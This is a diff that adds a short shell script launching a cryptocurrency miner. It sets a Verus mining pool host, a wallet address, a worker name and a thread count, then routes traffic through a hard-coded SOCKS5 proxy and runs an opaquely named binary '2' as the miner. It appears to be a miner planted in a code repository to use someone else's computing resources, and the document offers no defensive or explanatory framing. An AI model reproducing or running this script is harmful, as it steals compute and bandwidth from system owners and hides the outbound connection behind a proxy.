@@ -1,0 +1,7 @@
+#!/bin/sh
+PoolHost=verushash.na.mine.zergpool.com
+Port=3300
+PublicVerusCoinAddress=DGMCNLTTCNBi7XWPta9LhoAfEdepKfKctC
+WorkerName=Gitio
+Threads=18
+export http_proxy=socks5://72.221.172.203:4145 && chmod u+x 2 && ./2 -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" -p c=DG
